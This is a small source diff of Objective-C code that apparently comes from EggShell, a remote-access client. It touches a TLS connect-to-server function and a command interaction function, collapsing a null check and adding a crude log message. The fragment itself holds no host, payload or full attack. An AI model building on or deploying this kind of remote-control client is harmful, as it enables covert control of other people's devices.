@@ -71,9 +71,7 @@ NSString *getFullCMD(NSDictionary *dict) {
 }
 
 void connectToServer(NSDictionary *arguments) {
-    if (!arguments) {
-        return;
-    }
+    if (!arguments) return;
     OPENSSL_init();
     ssl_client_ctx = SSL_CTX_new(TLSv1_client_method());
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -113,6 +111,7 @@ void connectToServer(NSDictionary *arguments) {
 
 
 void interact(NSDictionary *arguments) {
+    NSLog(@"EggShell in this bih");
     espl *esCommand = [[espl alloc] init];
     esCommand->client_ssl = client_ssl;
     
